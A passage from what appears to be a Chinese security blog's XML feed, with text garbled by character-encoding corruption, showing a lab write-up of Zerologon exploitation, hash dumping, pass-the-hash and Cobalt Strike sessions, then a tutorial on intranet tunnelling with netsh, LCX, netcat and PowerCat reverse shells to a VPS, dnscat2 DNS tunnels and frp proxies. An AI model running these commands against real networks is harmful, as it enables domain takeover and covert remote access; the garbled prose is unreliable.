åˆæ²¡æœ‰æˆåŠŸï¼Œäº‹å®è¯æ˜æ°¸æ’ä¹‹è“ä¹Ÿä¸æ˜¯å¾ˆå¥½ç”¨</p><p>ä½¿ç”¨ CVE-2020-1472 è·å–åŸŸæ§æƒé™</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="bash"> mimikatz <span class="hljs-string">&quot;lsadump::zerologon /target:10.10.3.131 /account:OWA$&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>  <span class="hljs-comment"># æ¼æ´æ£€æµ‹</span></span><br><span class="hljs-keyword">shell</span><span class="bash"> mimikatz <span class="hljs-string">&quot;lsadump::zerologon /target:10.10.3.131 /account:OWA$ /exploit&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> <span class="hljs-comment"># ç½®é›¶</span></span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902134502718.png" alt="image-20210902134502718"></p><p>æŠ“å–ç°åœ¨çš„ hash</p><p><code>proxychains python3 secretsdump.py god.org/OWA\$@10.10.3.131 -no-pass</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902135849535.png" alt="image-20210902135849535"></p><p>ä¹‹ååˆ©ç”¨ wmiexec.py è¿æ¥åŸŸæ§ï¼Œä¸‹è½½ sam æ–‡ä»¶ä¸ºåæœŸæ¢å¤å¯†ç åšå‡†å¤‡</p><p> <code>proxychains python3 wmiexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 god.org/administrator@10.10.3.131</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902140447430.png" alt="image-20210902140447430"></p><blockquote><p>ä»£ç†ä¸å¤Ÿç¨³å®šï¼Œæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ç‰¹åˆ«å¡</p><p>åŠ¨ä½œè¦å¿«ï¼ï¼ æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</p></blockquote><p>ç„¶åæ¢å¤å¯†ç ï¼Œå…ˆä»ä¹‹å‰ä¸‹è½½çš„ save æ–‡ä»¶ä¸­æå–å‡º Hash</p><p><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145355281.png" alt="image-20210902145355281"></p><p>æ¢å¤å¯†ç </p><p><code>proxychains python3 reinstall_original_pw.py OWA 10.10.3.131 1ce6842c848ce11741dc8f6932856bae</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145420146.png" alt="image-20210902145420146"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145912439.png" alt="image-20210902145912439"></p><p><del>åé¢å¯ä»¥åˆ©ç”¨ IPC è¿æ¥åŸŸæ§ï¼Œç„¶åä¸Šä¼  CS çš„ payload</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902150224971.png" alt="image-20210902150224971"></p><p><del>åˆ©ç”¨ PsExec è¿œç¨‹è¿æ¥åˆ°åŸŸæ§ä¸»æœºï¼Œæ‰§è¡Œ CS Payload ä¸Šçº¿ CS</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902150932353.png" alt="image-20210902150932353"></p><blockquote><p>ä¸Šé¢çš„æ–¹æ³•æœ‰ç‚¹éº»çƒ¦</p></blockquote><p>ç›´æ¥åœ¨ CS ä¸Šå»ºç«‹ä¸€ä¸ª SMB ç›‘å¬ï¼Œç„¶ååˆ©ç”¨ç°æœ‰çš„ ä¼šè¯æ´¾ç”Ÿä¸€ä¸ªä¼šè¯å‡ºæ¥ï¼Œä¹‹ååœ¨æ¢æµ‹åˆ°å†…ç½‘å­˜æ´»ä¸»æœºçš„åœ°æ–¹å¡«å…¥æ·»åŠ çš„ç”¨æˆ·ï¼Œé€‰æ‹©æ´¾ç”Ÿå‡ºæ¥çš„ä¼šè¯å’Œ SMB ç›‘å¬ï¼Œç›´æ¥è¿æ¥å°±å¯ä»¥ä¸Šçº¿ CS äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153435066.png" alt="image-20210902153435066"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153458562.png" alt="image-20210902153458562"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153514666.png" alt="image-20210902153514666"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153545740.png" alt="image-20210902153545740"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153629576.png" alt="image-20210902153629576"></p><p>ä»¥åŒæ ·çš„æ–¹æ³•å¯ä»¥è·å–åˆ°å†…ç½‘å¦ä¸€å°ä¸»æœºçš„ä¼šè¯ï¼Œè¿™æ ·å°±å¯ä»¥æ‹¿ä¸‹äº†åŸŸå†…æ‰€æœ‰æƒé™äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153812422.png" alt="image-20210902153812422"></p><p><img src="D:\markdown\image-20210902153827988.png" alt="image-20210902153827988"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶åœºæ˜¯æˆ‘ç¬¬äºŒéæ‰“äº†ï¼Œæ•´ä½“æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯ä¸ºäº†ç†Ÿç»ƒæµç¨‹å’Œå·¥å…·çš„ä½¿ç”¨ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;çº¢æ—¥é¶åœº-ä¸€&quot;&gt;&lt;a href=&quot;#çº¢æ—¥é¶åœº-ä¸€&quot; class=&quot;headerlink&quot; title=&quot;çº¢æ—¥é¶åœº ä¸€&quot;&gt;&lt;/a&gt;çº¢æ—¥é¶åœº ä¸€&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ç¯å¢ƒæ­é…æ²¡ä»€ä¹ˆå¤§é—®é¢˜ï¼Œæ”¹ä¸€ä¸‹hostæ–‡ä»¶å°±å¯ä»¥äº†&lt;/p&gt;
&lt;/blockquote</summary>
      
    
    
    
    <category term="å†…ç½‘" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
    <category term="å†…ç½‘æ¸—é€" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘éš§é“æ­å»º</title>
    <link href="http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/</id>
    <published>2021-10-13T11:01:14.000Z</published>
    <updated>2021-10-13T11:02:02.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å†…ç½‘éš§é“æ­å»ºå®è·µ"><a href="#å†…ç½‘éš§é“æ­å»ºå®è·µ" class="headerlink" title="å†…ç½‘éš§é“æ­å»ºå®è·µ"></a>å†…ç½‘éš§é“æ­å»ºå®è·µ</h1><h2 id="netshéš§é“æ­å»º"><a href="#netshéš§é“æ­å»º" class="headerlink" title="netshéš§é“æ­å»º"></a>netshéš§é“æ­å»º</h2><p>  è·³æ¿æœºï¼šwin7    å†…ç½‘ä¸»æœºï¼šCentos 7</p><h3 id="åœºæ™¯ä¸€"><a href="#åœºæ™¯ä¸€" class="headerlink" title="åœºæ™¯ä¸€"></a>åœºæ™¯ä¸€</h3><p>åˆ©ç”¨è¾¹ç•Œçš„è¢«æ‹¿ä¸‹çš„webæœåŠ¡å™¨å»ºç«‹ç«¯å£è½¬å‘è§„åˆ™ï¼Œä½¿é—®åˆ©ç”¨webæœåŠ¡å™¨ä½œä¸ºè·³æ¿ä¸å†…ç½‘ä¸»æœºå»ºç«‹è”ç³»</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091644761.png" alt="image-20210805091644761"></p><p>åœ¨win7ä¸­æ‰§è¡Œï¼š<code>netsh interface portproxy add v4tov4 listenport=4567 connectaddress=10.10.3.129 connectport=22</code>ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><p>æŸ¥çœ‹æ˜¯å¦å¼€å¯ï¼š<code>netsh interface portproxy show all</code></p><p>åˆ é™¤è§„åˆ™ï¼š<code>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4567</code></p><p>æµ‹è¯•ç«¯å£è½¬å‘ç»“æœï¼Œè¿æ¥æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804114121495.png" alt="image-20210804114121495"></p><h3 id="åœºæ™¯äºŒ"><a href="#åœºæ™¯äºŒ" class="headerlink" title="åœºæ™¯äºŒ"></a>åœºæ™¯äºŒ</h3><p>æœ¬åœ°é˜²ç«å¢™åªå…è®¸æŸäº›ç«¯å£å‡ºç½‘ï¼Œå¯ä»¥åˆ©ç”¨netshæ­å»ºæœ¬åœ°ç«¯å£è½¬å‘ï¼Œå°†ä¸å…è®¸å‡ºç½‘çš„ç«¯å£è½¬å‘åˆ°ç™½åå•ç«¯å£ä¸Š<code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=12345 connectaddress=127.0.0.1 connectport=3389</code></p><p>æˆ–è€…åˆ©ç”¨netshæ“ä½œæœ¬åœ°çš„é˜²ç«å¢™è®¾ç½®</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow  # å¼€æ”¾é˜²ç«å¢™ç«¯å£<br>netsh advfirewall<span class="hljs-built_in"> firewall </span>delete rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 #åˆ é™¤è§„åˆ™<br></code></pre></td></tr></table></figure><h2 id="LCXç«¯å£ä»£ç†"><a href="#LCXç«¯å£ä»£ç†" class="headerlink" title="LCXç«¯å£ä»£ç†"></a>LCXç«¯å£ä»£ç†</h2><p>Windowsçš„ä¸ºlcx.exeï¼ŒLinuxçš„ä¸ºportmapï¼ˆè¿™ä¸ªå·¥å…·æœ‰ç‚¹è€äº†ï¼‰</p><p>ä¸‹è½½ï¼š<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><h3 id="æœ¬åœ°ç«¯å£è½¬å‘"><a href="#æœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="æœ¬åœ°ç«¯å£è½¬å‘"></a>æœ¬åœ°ç«¯å£è½¬å‘</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091741766.png" alt="image-20210805091741766"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">windowsï¼šlcx.exe -slave vps-ip vps-port  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> port æœ¬åœ°ç«¯å£è½¬å‘åˆ°VPS<br>lcx.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">3389</span><br>lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">33891</span><br></code></pre></td></tr></table></figure><p>å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°VPSä¸Š</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804142654140.png" alt="image-20210804142654140"></p><blockquote><p>å¯èƒ½æ˜¯å·¥å…·å¤ªè€äº†ï¼Œè¿æ¥ä¸Šä¸€ä¼šå°±è‡ªåŠ¨æ–­å¼€äº†</p></blockquote><h3 id="å†…ç½‘ä¸»æœºç«¯å£è½¬å‘"><a href="#å†…ç½‘ä¸»æœºç«¯å£è½¬å‘" class="headerlink" title="å†…ç½‘ä¸»æœºç«¯å£è½¬å‘"></a>å†…ç½‘ä¸»æœºç«¯å£è½¬å‘</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091809826.png" alt="image-20210805091809826"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl">webæœåŠ¡å™¨ä¸Šï¼šLcx.exe -slave  vps-ip  vps-port  å†…ç½‘ä¸»æœºip  å†…ç½‘ä¸»æœºç›®æ ‡ç«¯å£<br>Lcd.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.6</span> <span class="hljs-number">22</span><br><br>vpsï¼šLcx.exe -<span class="hljs-section">listen</span> vps-port å†…ç½‘ä¸»æœºç›®æ ‡ç«¯å£<br>Lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">221</span><br></code></pre></td></tr></table></figure><p>VPSä¸webæœåŠ¡å™¨å»ºç«‹é€šé“ï¼Œå°†å†…ç½‘ä¸»æœºç«¯å£è½¬å‘åˆ°VPSä¸Š</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143305962.png" alt="image-20210804143305962"></p><p>åˆ©ç”¨é€šé“è¿æ¥åˆ°å†…ç½‘ä¸»æœº</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143224155.png" alt="image-20210804143224155"></p><h2 id="NetCatä»£ç†"><a href="#NetCatä»£ç†" class="headerlink" title="NetCatä»£ç†"></a>NetCatä»£ç†</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091925952.png" alt="image-20210805091925952"></p><h3 id="æ­£å‘shell"><a href="#æ­£å‘shell" class="headerlink" title="æ­£å‘shell"></a>æ­£å‘shell</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>æœåŠ¡å™¨ï¼šnc<span class="hljs-number">64</span>.exe -lvp <span class="hljs-number">4445</span> -e c:\Windows\System<span class="hljs-number">32</span>\cmd.exe  ç›‘å¬è¿æ¥è¯·æ±‚<br><span class="hljs-attribute">VPS</span>ï¼šnc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">4445</span>  è¯·æ±‚è¿æ¥<br></code></pre></td></tr></table></figure><p>è¿æ¥æˆåŠŸè·å–åˆ°shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145253006.png" alt="image-20210804145253006"></p><h3 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘shell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">webæœåŠ¡å™¨ï¼šnc64.exe vps-ip vps-port -e c:\Windows\System32\cmd.exe<br>VPSï¼šnc64.exe -lvp<span class="hljs-built_in"> port </span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145741200.png" alt="image-20210804145741200"></p><blockquote><p>ä¸ªäººè§‰å¾—ä¸ç”¨å¤ªçº ç»“æ­£åï¼Œèƒ½è¿ä¸Šå°±å¯ä»¥äº† =_=</p></blockquote><h2 id="PowerCatä»£ç†"><a href="#PowerCatä»£ç†" class="headerlink" title="PowerCatä»£ç†"></a>PowerCatä»£ç†</h2><blockquote><p>PowerCat æ˜¯ncçš„powershellç‰ˆ ï¼Œä½¿ç”¨æ–¹æ³•å’Œncå·®ä¸å¤š</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">ä¸Šä¼ åˆ°webæœåŠ¡å™¨ä¸­ï¼Œç„¶åä¿®æ”¹æœåŠ¡å™¨powershellç­–ç•¥å¹¶å¯¼å…¥è„šæœ¬<br><span class="hljs-keyword">Set</span>-ExecutionPolicy remotesigned <br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powercat.ps1<br></code></pre></td></tr></table></figure><h3 id="æ­£å‘è¿æ¥shell"><a href="#æ­£å‘è¿æ¥shell" class="headerlink" title="æ­£å‘è¿æ¥shell"></a>æ­£å‘è¿æ¥shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091942498.png" alt="image-20210805091942498"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PowerCat</span>ï¼špowercat -l -p <span class="hljs-number">6666</span> -e cmd.exe -v<br><span class="hljs-attribute">vps</span>ï¼šnc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804155833809.png" alt="image-20210804155833809"></p><h3 id="åå‘è¿æ¥shell"><a href="#åå‘è¿æ¥shell" class="headerlink" title="åå‘è¿æ¥shell"></a>åå‘è¿æ¥shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091945928.png" alt="image-20210805091945928"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">PowerCatï¼špowercat -c <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -p <span class="hljs-number">6666</span> -e cmd.exe -v<br>vpsï¼šnc64.exe -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804160206174.png" alt="image-20210804160206174"></p><h3 id="æ­å»ºDNSéš§é“"><a href="#æ­å»ºDNSéš§é“" class="headerlink" title="æ­å»ºDNSéš§é“"></a>æ­å»ºDNSéš§é“</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092300471.png" alt="image-20210805092300471"></p><blockquote><p>PowerCatçš„DNSé€šä¿¡æ˜¯åŸºäº<code>dnscat</code>è®¾è®¡çš„ï¼Œåœ¨ä½¿ç”¨<code>dnscat</code>ä¹‹å‰éœ€è¦ä¸‹è½½å’Œè¿›è¡Œç¼–è¯‘</p></blockquote><p>Kaliä¸‹è½½dnscat2</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iagox86/</span>dnscat2.git<br>cd dnscat2<span class="hljs-regexp">/server/</span><br>gem install bundler<br>bundle install<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162355288.png" alt="image-20210804162355288"></p><p>kaliæ‰§è¡Œï¼š<code>ruby dnscat2.rb ttpowercat.test -e open --no-cache</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162932809.png" alt="image-20210804162932809"></p><p>webä¸»æœºï¼š<code>powercat -c kali-ip -p 53 -dns ttpowercat.test -e cmd.exe </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163057542.png" alt="image-20210804163057542"></p><p>kaliæ‰§è¡Œï¼š<code>session -i 1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163157341.png" alt="image-20210804163157341"></p><p>æ­å»ºæˆåŠŸ</p><h3 id="è·³æ¿NCéš§é“"><a href="#è·³æ¿NCéš§é“" class="headerlink" title="è·³æ¿NCéš§é“"></a>è·³æ¿NCéš§é“</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092357659.png" alt="image-20210805092357659"></p><p>å°†åŸŸæ§åˆ¶å™¨äº¤äº’åˆ°kali</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">å†…ç½‘ä¸»æœºï¼špowercat -l -v -p <span class="hljs-number">9999</span> -e cmd.exe<br>webæœåŠ¡å™¨ï¼špowercat -l -v -p <span class="hljs-number">2345</span> -r tcp:å†…ç½‘ä¸»æœºip:<span class="hljs-number">9999</span><br>kaliï¼šnc web-ip <span class="hljs-number">2345</span> -vv<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171831544.png" alt="image-20210804171831544"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171903589.png" alt="image-20210804171903589"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171720544.png" alt="image-20210804171720544"></p><h3 id="è·³æ¿DNSéš§é“"><a href="#è·³æ¿DNSéš§é“" class="headerlink" title="è·³æ¿DNSéš§é“"></a>è·³æ¿DNSéš§é“</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092426042.png" alt="image-20210805092426042"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">web</span>æœåŠ¡å™¨ï¼š<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">dns</span><span class="hljs-selector-pseudo">:kali-ip</span><span class="hljs-selector-pseudo">::ttpowercat.test</span><br><span class="hljs-selector-tag">kali</span>ï¼š<span class="hljs-selector-tag">ruby</span> <span class="hljs-selector-tag">dnscat2</span><span class="hljs-selector-class">.rb</span> <span class="hljs-selector-tag">ttpowercat</span><span class="hljs-selector-class">.test</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">open</span> <span class="hljs-selector-tag">--no-cache</span><br>å†…ç½‘ï¼š<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-c</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.131</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172742238.png" alt="image-20210804172742238"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172718398.png" alt="image-20210804172718398"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172759548.png" alt="image-20210804172759548"></p><p>è·å–åˆ°shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172833678.png" alt="image-20210804172833678"></p><h2 id="frpå†…ç½‘ç©¿é€"><a href="#frpå†…ç½‘ç©¿é€" class="headerlink" title="frpå†…ç½‘ç©¿é€"></a>frpå†…ç½‘ç©¿é€</h2><p>ä¸‹è½½ï¼š<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp æ˜¯ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ TCPã€UDPã€HTTPã€HTTPS ç­‰å¤šç§åè®®ã€‚å¯ä»¥å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼é€šè¿‡å…·æœ‰å…¬ç½‘ IP èŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ã€‚frpå’Œç«¯å£è½¬å‘å¹¶ä¸æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·çš„frpæ˜¯ä½¿ç”¨äº†å†…ç½‘çš„å…¨ç«¯å£å…¨æµé‡çš„</p><h3 id="ä¸€çº§ä»£ç†"><a href="#ä¸€çº§ä»£ç†" class="headerlink" title="ä¸€çº§ä»£ç†"></a>ä¸€çº§ä»£ç†</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101242047.png" alt="image-20210805101242047"></p><p>åˆ©ç”¨win10ä½œä¸ºæœåŠ¡ç«¯ï¼ŒWebä½œä¸ºå®¢æˆ·ç«¯æ­å»ºå†…ç½‘ä»£ç†</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows10<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>æ‰§è¡Œå¼€å¯å‘½ä»¤<br>frps.exe -c frpc.ini<br><br>webæœåŠ¡å™¨<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # ä¸æœåŠ¡å™¨ç«¯å£å¯¹åº”<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=2345<br><span class="hljs-attribute">plugin</span>=socks5<br>æ‰§è¡Œå¼€å¯å‘½ä»¤<br>frpc.exe -c frpc.ini<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101810242.png" alt="image-20210805101810242"></p><p>æµ‹è¯•è¿æ¥æˆåŠŸäº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101013784.png" alt="image-20210805101013784"></p><p>æœªæ­å»ºä»£ç†æ—¶ï¼Œè¿æ¥å¤±è´¥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805102024585.png" alt="image-20210805102024585"></p><p>æ­å»ºä»£ç†åï¼Œè¿æ¥æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805100948602.png" alt="image-20210805100948602"></p><h3 id="äºŒçº§ä»£ç†"><a href="#äºŒçº§ä»£ç†" class="headerlink" title="äºŒçº§ä»£ç†"></a>äºŒçº§ä»£ç†</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114923729.png" alt="image-20210805114923729"></p><p>åˆ©ç”¨åœ¨win10ï¼ˆfrpsï¼‰å’ŒwebæœåŠ¡å™¨ï¼ˆfrpcï¼‰æ­å»ºä»£ç†çš„åŸºç¡€ä¸Šåœ¨WebæœåŠ¡å™¨ï¼ˆfrpsï¼‰å’Œå†…ç½‘ä¸»æœº1ï¼ˆfrpcï¼‰ä¸Šæ­å»ºä»£ç†ï¼Œè®¿é—®å†…ç½‘ä¸»æœº2</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>æ‰§è¡Œå¼€å¯å‘½ä»¤<br>frps.exe -c frpc.ini<br><br>WebæœåŠ¡å™¨<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # ä¸æœåŠ¡å™¨ç«¯å£å¯¹åº”<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">local_ip</span>=10.10.3.18 # ä¸èƒ½å†™127.0.0.1 åæ­£å†™äº†å°±ä¼šé”™è¯¯<br><span class="hljs-attribute">local_port</span>=6000 # webä¸»æœºè¢«å†…ç½‘ä¸»æœºè¿æ¥çš„ç«¯å£<br><span class="hljs-attribute">remote_port</span>=6000 # æ˜ å°„åˆ°VPSçš„ç«¯å£<br><br><span class="hljs-comment"># frps.ini</span><br>[common]<br><span 